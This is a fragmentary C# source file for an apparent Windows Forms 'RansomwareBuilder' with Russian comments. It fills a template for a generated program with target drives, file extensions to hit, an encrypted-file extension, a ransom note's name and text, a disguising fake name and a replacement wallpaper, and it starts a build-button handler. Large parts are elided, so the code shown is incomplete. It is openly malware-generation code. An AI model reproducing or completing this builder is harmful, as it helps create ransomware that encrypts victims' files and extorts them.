...
namespace RansomwareBuilder
{
    public partial class Form1 : Form
    {
        ...
        {
            // Для verbatim-строк (@""...""): заменяем " на ""
            string EscVerbatim(string s) => string.IsNullOrEmpty(s) ? "" : s.Replace("\"", "\"\"");
...
{{
    class Program
    {{
        static string DRIVES = @""{EscVerbatim(drives)}"";
        static string EXTS = @""{EscVerbatim(exts)}"";
        static string ENC_EXT = @""{EscVerbatim(encExt)}"";
        static string NOTE_NAME = @""{EscVerbatim(noteName)}"";
        static string NOTE_CONTENT = @""{EscVerbatim(noteContent)}"";
        static string FAKE_NAME = @""{EscVerbatim(fakeName)}"";
        ...
        static string WALLPAPER_BASE64 = @""{EscVerbatim(wallpaperBase64)}"";
        static string WALLPAPER_EXT = @""{EscVerbatim(wallpaperExt)}"";
...
";
        ...
        private void BtnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                ...
                // Добавляем пользовательские диски
